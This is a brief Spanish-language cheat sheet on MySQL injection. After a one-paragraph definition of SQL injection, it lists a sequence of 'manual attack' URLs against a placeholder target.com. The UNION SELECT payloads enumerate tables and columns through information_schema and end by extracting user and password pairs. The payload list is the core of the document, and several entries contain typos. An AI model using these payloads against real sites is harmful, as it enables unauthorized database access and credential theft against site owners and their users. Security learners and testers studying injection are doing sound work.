# MYSQL Injection

Ss un método de infiltración de código intruso que se vale de una vulnerabilidad informática presente en una aplicación en el nivel de validación de las entradas para realizar operaciones sobre una base de datos. El origen de la vulnerabilidad radica en el incorrecto chequeo o filtrado de las variables utilizadas en un programa que contiene, o bien genera, código SQL. Es, de hecho, un error de una clase más general de vulnerabilidades que puede ocurrir en cualquier lenguaje de programación o script que esté embebido dentro de otro.

Se conoce como Inyección SQL, indistintamente, al tipo de vulnerabilidad, al método de infiltración, al hecho de incrustar código SQL intruso y a la porción de código incrustado.


## Algunos ataques Manuales

- http://www.target.com/target.php?id=1
- http://www.target.com/target.php?id=1=-1+union+select+1,2,3,4,5,6,7--
- http://www.target.com/target.php?id=1=-1+union+select+1,table_name,3,4,5,6,7+from+information_schema.tables
- http://www.target.com/target.php?id=1=-1+union+select+1,table_name,3,4,5,6,7+from+information_schema.tables+limit+2,1--
- http://www.target.com/target.php?id=1=-1+union+select+1,table_name,3,4,5,6,7+from+information_schema.tables+limit+76,1--
- http://www.target.com/target.php?id=1=-1+union+select+1,group_concat(column_name),3,4,5,6,7+from+information_schema,columns+where+table_name=char(NUMERO DEL ASCII)--
- http://www.target.com/target.php?id=1=-1+union+select+1,concat(user,0x3a,password),3,4,5,6,7+from+usuarios--

NOTA: [CONVERT TEXT TO ASCII HERE](http://www.unit-conversion.info/textools/ascii/)

pagina de interes: http://www.unixwiz.net/techtips/sql-injection.html
